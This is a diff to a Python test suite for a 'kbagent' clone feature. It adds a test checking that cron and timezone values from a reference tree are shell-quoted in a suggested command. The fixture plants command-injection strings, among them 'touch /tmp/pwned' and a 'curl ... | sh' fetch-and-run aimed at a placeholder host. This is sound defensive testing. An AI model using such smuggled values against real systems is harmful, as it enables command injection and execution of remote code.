@@ -10,6 +10,7 @@ clone still reported ``status: cloned`` with no warning.
 
 import copy
 import itertools
+import shlex
 import shutil
 from collections.abc import Callable
 from pathlib import Path
@@ -283,6 +284,12 @@ def _component_entry(components: list[dict[str, Any]], component_id: str) -> dic
 def _with_disabled_schedule(components: list[dict[str, Any]]) -> None:
     schedule = _component_entry(components, SCHED)["configurations"][0]
     schedule["configuration"]["schedule"]["state"] = "disabled"
+
+
+def _with_hostile_schedule(components: list[dict[str, Any]]) -> None:
+    schedule = _component_entry(components, SCHED)["configurations"][0]["configuration"]
+    schedule["schedule"]["cronTab"] = "0 3 * * *'; touch /tmp/pwned; echo '"
+    schedule["schedule"]["timezone"] = "UTC; curl https://example.invalid | sh"
 
 
 def _with_second_schedule(components: list[dict[str, Any]]) -> None:
@@ -881,6 +888,30 @@ def test_disabled_schedule_hint_keeps_it_disabled(tmp_path: Path, tmp_config_dir
     world = World(tmp_path, tmp_config_dir, reference=_with_disabled_schedule)
     [warning] = _warnings_of(world.clone(), "schedule_not_active")
     assert "--timezone UTC --disabled`" in warning["message"]
+
+
+def test_schedule_hint_quotes_values_from_the_reference_tree(
+    tmp_path: Path, tmp_config_dir: Path
+) -> None:
+    # The cron and the timezone come from the reference tree. The suggested
+    # command must pass them as single arguments, never as extra shell commands.
+    world = World(tmp_path, tmp_config_dir, reference=_with_hostile_schedule)
+    [warning] = _warnings_of(world.clone(), "schedule_not_active")
+    command = warning["message"].split("`")[1]
+    flow_id = world.target(FLOW)["id"]
+    assert shlex.split(command) == [
+        "kbagent",
+        "flow",
+        "schedule",
+        "--project",
+        "target",
+        "--flow-id",
+        flow_id,
+        "--cron",
+        "0 3 * * *'; touch /tmp/pwned; echo '",
+        "--timezone",
+        "UTC; curl https://example.invalid | sh",
+    ]
 
 
 def test_two_schedules_on_one_flow_get_no_command(tmp_path: Path, tmp_config_dir: Path) -> None:
